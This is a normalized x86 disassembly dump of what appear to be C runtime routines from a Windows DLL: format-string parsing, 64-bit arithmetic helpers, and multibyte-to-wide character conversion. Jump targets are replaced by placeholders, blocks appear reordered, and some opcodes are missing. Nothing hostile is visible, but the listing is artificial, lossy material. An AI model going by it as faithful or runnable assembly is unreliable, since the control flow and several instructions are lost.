call sub_100276e9
jmp r-xdata
mov ecx [ ebp - 0x258 ]
lea esi [ ebp - 0x224 ]
call sub_100276e9
mov al [ edi ]
inc edi
mov [ ebp - 0x23c ] edi
test al al
je r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x80
jmp r-xdata
sub eax esi
je r-xdata
or [ ebp - 0x210 ] 0x4
neg [ ebp - 0x234 ]
jmp r-xdata
or [ ebp - 0x218 ] 0xffffffff
jmp r-xdata
cmp al 0x33
jne r-xdata
cmp [ edi + 0x1 ] 0x34
jne r-xdata
or [ ebp - 0x210 ] 0x20
jmp r-xdata
cmp dl 0x6c
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x40
cmp eax 0x53
jg r-xdata
or [ ebp - 0x210 ] 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x64
je r-xdata
cmp [ edi + 0x1 ] 0x32
jne r-xdata
add edi 0x2
or [ ebp - 0x210 ] 0x8000
mov [ ebp - 0x23c ] edi
jmp r-xdata
cmp [ edi ] 0x6c
jne r-xdata
cmp dl 0x77
jne r-xdata
mov ecx [ ebp - 0x218 ]
cmp ecx 0xffffffff
jne r-xdata
dec eax
dec eax
je r-xdata
mov [ ebp - 0x218 ] esi
cmp eax 0x65
jl r-xdata
test ecx 0x1000
jne r-xdata
add ebx esi
mov eax [ ebx - 0x8 ]
mov edx [ ebx - 0x4 ]
jmp r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al 0x69
je r-xdata
add edi 0x2
and [ ebp - 0x210 ] 0xffff7fff
mov [ ebp - 0x23c ] edi
jmp r-xdata
or [ ebp - 0x210 ] 0x10
jmp r-xdata
inc edi
or [ ebp - 0x210 ] 0x1000
mov [ ebp - 0x23c ] edi
jmp r-xdata
or [ ebp - 0x210 ] 0x800
jmp r-xdata
add ebx 0x4
test [ ebp - 0x210 ] 0x810
mov [ ebp - 0x228 ] ebx
mov ebx [ ebx - 0x4 ]
mov [ ebp - 0x21c ] ebx
je r-xdata
mov ecx 0x7fffffff
mov [ ebp - 0x220 ] 0xa
sub eax 0x3
jne r-xdata
test [ ebp - 0x210 ] 0x80
mov [ ebp - 0x220 ] 0x10
je r-xdata
cmp [ ebp - 0x25c ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
add ebx 0x4
test cl 0x20
je r-xdata
mov [ ebp - 0x228 ] ebx
mov [ ebp - 0x260 ] ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
test [ ebp - 0x210 ] 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or [ ebp - 0x210 ] esi
jmp r-xdata
cmp al 0x6f
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
mov [ ebp - 0x260 ] 0x27
mov ecx [ ebp - 0x210 ]
test ecx 0x8000
je r-xdata
mov al [ ebp - 0x260 ]
add al 0x51
mov [ ebp - 0x22c ] 0x30
mov [ ebp - 0x22b ] al
mov [ ebp - 0x230 ] 0x2
jmp r-xdata
cmp [ ebp - 0x254 ] 0x0
je r-xdata
mov eax [ ebp - 0x210 ]
test al 0x40
je r-xdata
or [ ebp - 0x210 ] 0x40
cmp [ ebp - 0x218 ] 0x0
lea edi [ ebp - 0x20c ]
mov eax 0x200
mov [ ebp - 0x21c ] edi
mov [ ebp - 0x264 ] eax
jge r-xdata
cmp eax 0x69
je r-xdata
mov eax [ ebx - 0x4 ]
test cl 0x40
je r-xdata
mov [ ebp - 0x228 ] ebx
test cl 0x40
je r-xdata
test [ ebp - 0x210 ] 0x9000
mov ebx edx
mov edi eax
jne r-xdata
test edx edx
jg r-xdata
mov eax [ ebx ]
add ebx 0x4
mov [ ebp - 0x228 ] ebx
test eax eax
je r-xdata
sub eax ecx
je r-xdata
or [ ebp - 0x210 ] 0x800
add dl 0x20
mov [ ebp - 0x26c ] 0x1
mov [ ebp - 0x211 ] dl
dec eax
dec eax
je r-xdata
cmp al 0x75
je r-xdata
mov eax [ ebp - 0x21c ]
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x21c ] eax
mov eax [ ebp - 0x21c ]
mov [ ebp - 0x238 ] 0x1
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x21c ] eax
push [ ebp - 0x254 ]
call sub_1001a3eb
and [ ebp - 0x254 ] 0x0
pop ecx
mov ebx [ ebp - 0x234 ]
sub ebx [ ebp - 0x220 ]
sub ebx [ ebp - 0x230 ]
mov [ ebp - 0x264 ] ebx
test al 0xc
jne r-xdata
test eax 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x218 ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
xor edx edx
cdq
jmp r-xdata
movzx eax [ ebx - 0x4 ]
movsx eax [ ebx - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x218 ] 0x0
jge r-xdata
xor ebx ebx
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x21c ] eax
push eax
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
dec eax
dec eax
jne r-xdata
test [ ebp - 0x210 ] 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x78
je r-xdata
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
mov edi [ ebp - 0x258 ]
mov ecx [ ebp - 0x230 ]
lea eax [ ebp - 0x22c ]
push eax
lea eax [ ebp - 0x224 ]
call sub_1002771c
test [ ebp - 0x210 ] 0x8
pop ecx
je r-xdata
mov edi ebx
test ebx ebx
jle r-xdata
test al 0x1
je r-xdata
mov [ ebp - 0x22c ] 0x2d
jmp r-xdata
cmp [ ebp - 0x218 ] eax
jle r-xdata
cmp dl 0x67
jne r-xdata
mov eax [ ebx ]
mov esi [ DecodePointer@IAT ]
add ebx 0x8
mov [ ebp - 0x278 ] eax
mov eax [ ebx - 0x4 ]
mov [ ebp - 0x274 ] eax
lea eax [ ebp - 0x250 ]
push eax
push [ ebp - 0x26c ]
movsx eax dl
push [ ebp - 0x218 ]
mov [ ebp - 0x228 ] ebx
push eax
push [ ebp - 0x264 ]
lea eax [ ebp - 0x278 ]
push edi
push eax
push [ rw-data ]
call esi
call eax
mov ebx [ ebp - 0x210 ]
add esp 0x1c
and ebx 0x80
je r-xdata
mov esi [ ebx ]
add ebx 0x4
mov [ ebp - 0x228 ] ebx
call sub_10027516
test eax eax
je r-xdata
cmp eax 0x6f
jne r-xdata
test cl 0x40
je r-xdata
cdq
jmp r-xdata
and [ ebp - 0x210 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x218 ] eax
jle r-xdata
mov [ ebp - 0x218 ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
neg edx
or [ ebp - 0x210 ] 0x100
test eax eax
jae r-xdata
mov [ ebp - 0x220 ] eax
test [ ebp - 0x210 ] 0x800
movsx eax [ eax ]
mov [ ebp - 0x21c ] ecx
je r-xdata
add ebx 0x4
test [ ebp - 0x210 ] 0x810
mov [ ebp - 0x228 ] ebx
je r-xdata
or [ ebp - 0x210 ] 0x800
jmp r-xdata
dec eax
dec eax
jne r-xdata
cmp al 0x58
je r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x21c ]
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x21c ]
sar eax 0x1
jmp r-xdata
cmp [ ebp - 0x238 ] 0x0
mov ebx [ ebp - 0x220 ]
je r-xdata
test [ ebp - 0x210 ] 0x4
jne r-xdata
mov ecx [ ebp - 0x258 ]
lea esi [ ebp - 0x224 ]
mov al 0x20
dec edi
call sub_100276e9
cmp [ ebp - 0x224 ] 0xffffffff
je r-xdata
test al 0x2
je r-xdata
mov [ ebp - 0x22c ] 0x2b
jmp r-xdata
mov [ ebp - 0x230 ] 0x1
cmp [ ebp - 0x218 ] 0xa3
jle r-xdata
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x218 ] 0x1
jmp r-xdata
cmp [ ebp - 0x211 ] 0x67
jne r-xdata
cmp [ ebp - 0x218 ] 0x0
jne r-xdata
test [ ebp - 0x210 ] 0x20
je r-xdata
test [ ebp - 0x210 ] 0x80
mov [ ebp - 0x220 ] esi
je r-xdata
mov eax edi
or eax ebx
jne r-xdata
mov [ ebp - 0x218 ] eax
and [ ebp - 0x238 ] 0x0
jmp r-xdata
cdq
sub eax edx
sar eax 0x1
mov [ ebp - 0x238 ] 0x1
jmp r-xdata
mov al [ ebx - 0x4 ]
mov [ ebp - 0x20c ] al
mov [ ebp - 0x220 ] 0x1
movzx eax [ ebx - 0x4 ]
push eax
push 0x200
lea eax [ ebp - 0x20c ]
push eax
lea eax [ ebp - 0x220 ]
push eax
call sub_10027681
add esp 0x10
test eax eax
je r-xdata
and [ ebp - 0x240 ] 0x0
inc eax
add eax 0x2
push [ ebp - 0x21c ]
lea eax [ ebp - 0x224 ]
mov ecx ebx
call sub_1002771c
pop ecx
test ebx ebx
jle r-xdata
jmp r-xdata
test edi edi
jg r-xdata
mov [ ebp - 0x22c ] 0x20
mov esi [ ebp - 0x218 ]
add esi 0x15d
push esi
call sub_1001bcbc
mov dl [ ebp - 0x211 ]
pop ecx
mov [ ebp - 0x254 ] eax
test eax eax
je r-xdata
cmp [ edi ] 0x2d
jne r-xdata
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x250 ]
push eax
push edi
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
mov eax [ ebp - 0x224 ]
mov [ esi ] eax
mov ax [ ebp - 0x224 ]
mov [ esi ] ax
jmp r-xdata
or [ ebp - 0x210 ] 0x200
jmp r-xdata
lea esi [ ebp - 0xd ]
and [ ebp - 0x230 ] eax
lea eax [ ebp - 0x20c ]
mov [ ebp - 0x21c ] eax
jmp r-xdata
mov [ ebp - 0x25c ] 0x1
jmp r-xdata
test [ ebp - 0x210 ] 0x4
je r-xdata
mov esi [ ebp - 0x21c ]
test ebx ebx
jg r-xdata
mov [ ebp - 0x218 ] 0xa3
mov [ ebp - 0x21c ] eax
mov [ ebp - 0x264 ] esi
mov edi eax
jmp r-xdata
push edi
jmp r-xdata
or [ ebp - 0x210 ] 0x100
inc edi
mov [ ebp - 0x21c ] edi
lea eax [ ebp - 0x250 ]
push eax
push edi
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
mov [ ebp - 0x25c ] 0x1
jmp r-xdata
mov eax [ ebp - 0x220 ]
cdq
push edx
push eax
push ebx
push edi
call sub_10025e50
add ecx 0x30
mov [ ebp - 0x264 ] ebx
mov edi eax
mov ebx edx
cmp ecx 0x39
jle r-xdata
mov eax edi
or eax ebx
je r-xdata
mov ebx [ ebp - 0x264 ]
jmp r-xdata
or [ ebp - 0x224 ] 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x270 ]
test ecx ecx
je r-xdata
lea esi [ ebp - 0x224 ]
mov ecx edi
mov al 0x30
dec ebx
call sub_100276e9
cmp [ ebp - 0x224 ] 0xffffffff
je r-xdata
call sub_1001cbb0
pop ecx
jmp r-xdata
mov [ esi ] cl
dec esi
jmp r-xdata
add ecx [ ebp - 0x260 ]
lea eax [ ebp - 0xd ]
sub eax esi
inc esi
test [ ebp - 0x210 ] 0x200
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x21c ] esi
je r-xdata
test ebx ebx
jg r-xdata
cmp [ ebp - 0x224 ] 0x0
jl r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x224 ]
call sub_1002771c
pop ecx
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x218 ]
dec [ ebp - 0x218 ]
test eax eax
jg r-xdata
test eax eax
je r-xdata
lea esi [ ebp - 0x224 ]
mov ecx edi
mov al 0x20
dec ebx
call sub_100276e9
cmp [ ebp - 0x224 ] 0xffffffff
je r-xdata
movzx eax [ esi ]
push eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x270 ]
push eax
dec ebx
add esi 0x2
call sub_10027681
add esp 0x10
test eax eax
jne r-xdata
jmp r-xdata
dec [ ebp - 0x21c ]
mov ecx [ ebp - 0x21c ]
mov [ ecx ] 0x30
inc eax
jmp r-xdata
mov ecx esi
cmp [ ecx ] 0x30
je r-xdata
sub_10028360
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
add ecx 0x1
neg ecx
sub edi 0x1
mov al [ ebp + 0xc ]
std
[ edi ]
add edi 0x1
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_1002838d
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_1001b46f
mov ebx [ ebp + 0x8 ]
mov esi 0x100
cmp ebx esi
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_1001bddd
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_1002769e
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x1
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
call sub_1002290c
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x8 ]
je r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xcc ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx ecx [ ebp - 0x7 ]
shl eax 0x8
or eax ecx
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push esi
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_1001b6dd
add esp 0x24
test eax eax
je r-xdata
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_100284a2
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_1002838d
pop ecx
pop ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
pop ebp
retn
add eax 0x20
pop ebp
retn
sub_100284ce
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_1001b46f
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_1002a084
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_100295e2
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1001a809
leave
retn
sub_10028576
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_1001b46f
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_1002a084
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_10029b33
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1001a809
leave
retn
sub_1002861e
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x14 ]
push ebx
mov ebx [ ecx + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
cmp esi eax
jne r-xdata
cmp [ ebp + 0xc ] eax
jbe r-xdata
call sub_1001bddd
push 0x16
pop esi
mov [ eax ] esi
mov edx [ ebp + 0x10 ]
mov [ esi ] al
cmp edx eax
jle r-xdata
pop esi
pop ebx
pop ebp
retn
inc eax
cmp [ ebp + 0xc ] eax
ja r-xdata
mov eax edx
push edi
lea edi [ esi + 0x1 ]
mov [ esi ] 0x30
mov eax edi
test edx edx
jle r-xdata
call sub_1001bddd
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov [ eax ] 0x0
test edx edx
js r-xdata
mov cl [ ebx ]
test cl cl
je r-xdata
call sub_1001ea75
mov eax esi
jmp r-xdata
cmp [ esi ] 0x31
jne r-xdata
cmp [ ebx ] 0x35
jl r-xdata
push 0x30
pop ecx
movsx ecx cl
inc ebx
jmp r-xdata
push edi
call sub_1001cbb0
inc eax
push eax
push edi
push esi
call sub_1001a060
add esp 0x10
inc [ ecx + 0x4 ]
jmp r-xdata
jmp r-xdata
mov ecx [ ebp + 0x14 ]
mov [ eax ] cl
inc eax
dec edx
test edx edx
jg r-xdata
xor eax eax
pop edi
dec eax
cmp [ eax ] 0x39
je r-xdata
mov [ eax ] 0x30
inc [ eax ]
sub_100286d1
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0xc ]
movzx eax [ ecx + 0x6 ]
push ebx
mov ebx eax
shr ebx 0x4
and eax 0x8000
push esi
mov edx 0x7ff
and ebx edx
push edi
mov [ ebp + 0xc ] eax
mov eax [ ecx + 0x4 ]
mov ecx [ ecx ]
movzx edi bx
mov esi 0x80000000
and eax 0xfffff
mov [ ebp - 0x4 ] esi
test edi edi
je r-xdata
xor edx edx
cmp eax edx
jne r-xdata
cmp edi edx
je r-xdata
add ebx 0x3c01
mov [ ebp - 0x4 ] edx
cmp ecx edx
jne r-xdata
mov edi 0x7fff
jmp r-xdata
add ebx 0x3c00
jmp r-xdata
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
test esi edx
je r-xdata
mov eax [ ebp + 0x8 ]
mov cx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov [ eax ] edx
jmp r-xdata
mov edx ecx
shr edx 0x15
shl eax 0xb
or edx eax
or edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
shl ecx 0xb
jmp r-xdata
movzx edi bx
mov ecx [ eax ]
mov ebx ecx
shr ebx 0x1f
add edx edx
or edx ebx
add ecx ecx
add edi 0xffff
mov ecx [ ebp + 0xc ]
or ecx edi
pop edi
pop esi
mov [ eax + 0x8 ] cx
pop ebx
leave
retn
sub_10028784
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov [ ebp - 0x24 ] eax
push edi
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_100286d1
pop ecx
pop ecx
lea eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x11
sub esp 0xc
lea esi [ ebp - 0x30 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
call sub_1002a760
mov esi [ ebp - 0x24 ]
mov [ ebx + 0x8 ] eax
movsx eax [ ebp - 0x1e ]
mov [ ebx ] eax
movsx eax [ ebp - 0x20 ]
mov [ ebx + 0x4 ] eax
lea eax [ ebp - 0x1c ]
push eax
push [ ebp + 0x18 ]
push esi
call sub_1001daf3
add esp 0x24
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1001ea23
int3
mov ecx [ ebp - 0x4 ]
pop edi
mov [ ebx + 0xc ] esi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_1001a809
leave
retn
sub_10028820
push edi
push esi
push ebp
xor edi edi
xor ebp ebp
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
inc ebp
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x18 ]
mov ecx eax
mov eax esi
mul [ esp + 0x18 ]
add edx ecx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
dec ebp
jns r-xdata
dec esi
sub eax [ esp + 0x18 ]
sbb edx [ esp + 0x1c ]
cmp edx [ esp + 0x14 ]
ja r-xdata
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
dec edi
jne r-xdata
neg edx
neg eax
sbb edx 0x0
jb r-xdata
pop ebp
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
xor ebx ebx
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_10028900
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov eax edx
xor edx edx
and cl 0x1f
shr eax cl
retn
shrd eax edx cl
shr edx cl
retn
sub_10028928
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
and eax 0xfff7ffff
and ecx eax
push esi
mov esi [ ebp + 0x8 ]
test ecx 0xfcf0fce0
je r-xdata
push eax
push [ ebp + 0xc ]
test esi esi
je r-xdata
test esi esi
je r-xdata
call sub_1002b186
call sub_1002b186
mov [ esi ] eax
jmp r-xdata
call sub_1001bddd
push 0x16
pop esi
mov [ eax ] esi
call sub_1001ea75
mov eax esi
jmp r-xdata
push 0x0
push 0x0
call sub_1002b186
pop ecx
pop ecx
mov [ esi ] eax
pop ecx
pop ecx
xor eax eax
pop esi
pop ebp
retn
sub_10028987
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x40
push edi
jne r-xdata
add [ esi + 0x4 ] 0xfffffffe
js r-xdata
push esi
call sub_100274f0
pop ecx
mov ebx rw-data
cmp eax 0xffffffff
je r-xdata
movzx eax [ ebp + 0x8 ]
push esi
push eax
call sub_1002b498
pop ecx
pop ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
mov [ ecx ] ax
add [ esi ] 0x2
jmp r-xdata
mov eax ebx
push esi
call sub_100274f0
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1001a809
leave
retn
push esi
call sub_100274f0
pop ecx
cmp eax 0xffffffff
je r-xdata
push esi
call sub_100274f0
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_100274f0
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov eax ebx
push esi
call sub_100274f0
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov al [ eax + 0x24 ]
and al 0x7f
cmp al 0x2
je r-xdata
push esi
call sub_100274f0
pop ecx
cmp eax 0xffffffff
je r-xdata
push esi
call sub_100274f0
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_100274f0
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov eax ebx
push esi
call sub_100274f0
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov al [ eax + 0x24 ]
and al 0x7f
cmp al 0x1
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push 0x5
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_10027681
add esp 0x10
test eax eax
je r-xdata
push esi
call sub_100274f0
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_100274f0
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
xor edi edi
cmp [ ebp - 0x10 ] edi
jle r-xdata
mov eax 0xffff
jmp r-xdata
test [ eax + 0x4 ] 0x80
je r-xdata
mov ax [ ebp + 0x8 ]
jmp r-xdata
dec [ esi + 0x4 ]
js r-xdata
movsx eax [ ebp + edi - 0xc ]
push esi
push eax
call sub_1001f13e
pop ecx
pop ecx
mov eax [ esi ]
mov cl [ ebp + edi - 0xc ]
mov [ eax ] cl
mov ecx [ esi ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
inc edi
cmp edi [ ebp - 0x10 ]
jl r-xdata
cmp eax 0xffffffff
je r-xdata
sub_10028b0e
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ esi ] bl
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_1001b46f
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_1002769e
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push 0x1
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0xac ]
cmp ecx 0x1
jle r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx ecx [ esi ]
mov [ eax ] cx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0xac ]
jb r-xdata
cmp [ ebp + 0x10 ] ecx
jl r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_1001bddd
mov [ eax ] 0x2a
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ esi + 0x1 ] bl
je r-xdata
xor edx edx
cmp [ ebp + 0x8 ] ebx
setne dl
push edx
push [ ebp + 0x8 ]
push ecx
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ ebp - 0x10 ]
jne r-xdata
pop esi
pop ebx
leave
retn
